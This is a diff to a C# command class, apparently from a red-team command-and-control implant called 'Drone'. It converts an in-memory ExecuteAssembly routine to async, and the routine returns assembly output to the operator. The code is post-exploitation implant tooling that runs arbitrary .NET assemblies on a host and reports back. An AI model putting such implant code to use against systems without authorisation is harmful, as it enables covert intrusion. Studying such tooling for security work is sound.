@@ -1,6 +1,7 @@
 ﻿using System;
 using System.IO;
 using System.Threading;
+using System.Threading.Tasks;
 
 namespace Drone.Commands;
 
@@ -9,7 +10,7 @@ public sealed class ExecuteAssembly : DroneCommand
     public override byte Command => 0x3F;
     public override bool Threaded => true;
 
-    public override void Execute(DroneTask task, CancellationToken cancellationToken)
+    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
     {
         var appDomain = AppDomain.CreateDomain(Helpers.GenerateShortGuid());
 
@@ -25,7 +26,7 @@ public sealed class ExecuteAssembly : DroneCommand
         t.Start();
         
         // send a task running
-        Drone.SendTaskRunning(task.Id);
+        await Drone.SendTaskRunning(task.Id);
 
         // whilst assembly is executing
         // keep looping and reading stream
@@ -44,7 +45,7 @@ public sealed class ExecuteAssembly : DroneCommand
             output = ReadStream(ms);
 
             if (output.Length > 0)
-                Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.RUNNING, output));
+                await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.RUNNING, output));
 
             Thread.Sleep(100);
             
@@ -52,7 +53,7 @@ public sealed class ExecuteAssembly : DroneCommand
         
         // after task has finished, do a final read
         output = ReadStream(ms);
-        Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, output));
+        await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, output));
         
         AppDomain.Unload(appDomain);
     }
